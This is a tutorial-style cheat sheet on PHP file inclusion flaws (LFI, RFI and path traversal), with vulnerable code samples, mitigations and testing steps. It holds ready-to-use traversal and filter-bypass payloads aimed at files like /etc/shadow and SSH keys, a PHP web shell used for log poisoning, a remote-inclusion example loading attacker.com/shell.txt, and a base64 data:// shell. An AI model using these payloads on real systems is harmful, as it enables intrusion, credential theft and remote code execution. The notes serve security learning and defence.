🗂️ **File Inclusion** is a vulnerability that allows an attacker to include (load) files from the local server or external sources into a web application.
- It happens when user input is improperly handled in file path operations.
- Two main types:
    - **LFI (Local File Inclusion)** – Loads files from the same server.
    - **RFI (Remote File Inclusion)** – Loads files from remote servers.

## 🪜 Path Traversal

### 📌 What Is It?
**Path Traversal** (or Directory Traversal) allows attackers to break out of the intended directory and access arbitrary files on the server by injecting sequences like `../`.

It is a **core technique used in LFI**.
In PHP, occurs when user's input is passed to functions like `file_get_contents` to read the content of a file.
### 🧪 Payload Examples

```text
?page=../../../../etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd         # URL-encoded
?page=....//....//....//etc/passwd       # Filter bypass
?page=..\\..\\..\\windows\\win.ini       # Windows
```
### 🧠 Bypass Techniques

|Technique|Payload Example|
|---|---|
|Double encoding|`%252e%252e%252f` (decodes to `../../`)|
|Null byte injection (older PHP)|`../../etc/passwd%00`|
|Obfuscation|`....//etc/passwd`|
|Mixed slashes|`/etc\passwd` or `.\..\..\`|

### 📂 Target Files

#### 🐧 Linux

| File                          | Purpose                                |
| ----------------------------- | -------------------------------------- |
| `/etc/passwd`                 | Lists system users                     |
| `/etc/shadow`                 | Password hashes (root-only)            |
| `/proc/self/environ`          | Environment vars (includes User-Agent) |
| `/var/log/apache2/access.log` | May contain log-injected payloads      |
| `config.php`                  | Web app secrets and credentials        |
| `/root/.ssh/id_rsa`           | Private SSH key                        |

#### 🪟 Windows

|File|Purpose|
|---|---|
|`C:\Windows\win.ini`|Always exists (used to confirm LFI)|
|`C:\boot.ini`|Boot settings (legacy systems)|
|`C:\Users\Administrator\Desktop\flag.txt`|Sensitive data|
|`C:\xampp\mysql\data\mysql\user.MYD`|MySQL users (XAMPP)|

## 🧪 Local File Inclusion (LFI)

### 📌 What Is It?

**LFI** allows the attacker to include files from the server's local file system in the web application’s response or execution.

 With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications
### 🧨 Examples

***No directory specified:***
```php
<?PHP 
	include($_GET["lang"]);
?>
```
Payload can be absolute path (e.g. `/etc/passwd`)

***Specified Directory:***
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
Payload must use relative path since the directory is specified. (e.g.: `../../../../etc/passwd`)

***Null Byte bypass***
`include("languages/../../../../../etc/passwd%00").".php");` which is equivalent to `include("languages/../../../../../etc/passwd");`

>**Note:** the %00 trick is fixed and not working with PHP 5.3.4 and above.

***Filtered keywords bypass***
Using Null Byte %00 or the current directory trick at the end of filtered keyword `/.`
``` html
?lang=/etc/passwd%00
?lang=/etc/passwd/.
```

***Common Path traversal Bypass***
In case of `../` gets stripped out:
```text
....//....//....//....//....//etc/passwd
```

***Others***:
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=....//....//....//etc/passwd
```
### 🧠 Useful Tricks

- **Log Poisoning** – Inject PHP code into logs (e.g. via User-Agent) and then include the log file to execute code.
- **Wrapper abuse** – Use PHP streams like `php://filter`, `php://input`, `data://` to read or inject code.
##### Example: Log Poisoning for RCE
1. Set User-Agent to PHP payload:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
2. Access the log:
    ```
    ?page=/var/log/apache2/access.log&cmd=id
    ```

## 🌐 Remote File Inclusion (RFI)

### 📌 What Is It?

**RFI** allows attackers to load and execute a script from a remote server.
- Requires `allow_url_include = On` in `php.ini`.
### Risks and Impact
- Remote Code Execution
- Sensitive Information Disclosure
- Denial Of Service (DoS)
### 💥 Exploitation Example

1. Payload:
    ```text
    ?page=http://attacker.com/shell.txt
    ```
2. Remote file (hosted on attacker's server):
    ```php
    <?php system($_GET['cmd']); ?>
    ```
3. Execute:
    ```text
    ?page=http://attacker.com/shell.txt&cmd=whoami
    ```

## ⚙️ PHP Wrappers for LFI/RFI

| Wrapper                                                             | Description                                      |
| ------------------------------------------------------------------- | ------------------------------------------------ |
| `php://filter/convert.base64-encode/resource=index.php`             | Dumps base64 source code                         |
| `php://input`                                                       | Reads raw POST body                              |
| `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` | Inline base64 payload                            |
| `expect://id`                                                       | Executes system commands (rare, must be enabled) |

## 🛡️ Mitigation Techniques

##### 1. Input Validation & Whitelisting
- Use a **predefined list** of allowable files (not user-controlled).
- Avoid passing unsanitized user input into file paths.
##### 2. Path Normalization
- Use functions like `realpath()` or `basename()` to clean input.
- (Blacklist) Reject input containing `../`, `%00`, `%2e%2e`, etc.
##### 3. Keep system and services on latest version
- Always update and make sure that services and frameworks are in the latest version
##### 4. Use generic errors
- Disable errors to avoid leaking the path of the application and other potentially revealing information
##### 5. Disable Dangerous PHP Settings
- Disable `allow_url_include`
- Consider disabling `allow_url_fopen`
##### 6. Only allow what is required
- allow only protocols and PHP wrappers that are in need
##### 7. Use Safe Functions
- Use absolute paths.
- Avoid dynamic `include()`, `require()`, or `fopen()` based on user input.
##### 8. Consider WAF
- A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.

## 🔍 Detection Tips

- Look for URL parameters like:
    - `?page=`, `?file=`, `?template=`, `?lang=`
- Try path traversal payloads and monitor:
    -  Response errors (e.g., “No such file”)    
    - Content leaks (e.g., `/etc/passwd` content)
- Use wrappers like `php://filter` to dump source

## Steps for testing for LFI

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

### 📝 Note on `$_REQUEST` in PHP

The **`$_REQUEST`** superglobal in PHP can receive input from **GET**, **POST**, or **COOKIE** methods.

This means:
- If the vulnerable script uses `$_REQUEST['page']`, the attacker can send the payload via:
    - A **POST** parameter
    - A **Cookie**
    - Or even override with **GET**

📌 This makes exploitation more flexible and may bypass WAFs or logging filters that only monitor GET parameters.
